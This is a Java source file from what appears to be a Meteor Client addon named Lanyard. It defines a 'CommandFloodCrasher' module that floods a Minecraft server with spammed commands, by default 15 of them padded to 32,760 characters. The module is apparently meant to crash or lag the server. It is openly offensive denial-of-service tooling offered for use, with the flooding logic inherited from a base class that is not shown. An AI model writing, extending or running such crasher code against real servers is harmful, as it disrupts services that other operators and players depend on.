package com.haykkonen.lanyard.modules.crashers.flood;

import com.haykkonen.lanyard.Lanyard;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.settings.Setting;
import org.jetbrains.annotations.NotNull;

public class CommandFloodCrasher extends AbstractCommandFloodCrasher {

    private final Setting<String> command = sgGeneral.add(new StringSetting.Builder()
        .name("command")
        .description("The command to spam.")
        .defaultValue("skill")
        .build()
    );

    public CommandFloodCrasher() {
        super(Lanyard.LANYARD_CRASHERS_CATEGORY, "CommandFlood", "Floods the server with a command spam.");
        this.amount.set(15);
        this.spamSize.set(32760);
    }

    @Override
    protected @NotNull String getCommandPayload() {
        String userCommand = this.command.get();
        if (userCommand == null || userCommand.isBlank()) {
            return "lanyard";
        }
        return userCommand.startsWith("/") ? userCommand.substring(1) : userCommand;
    }
}
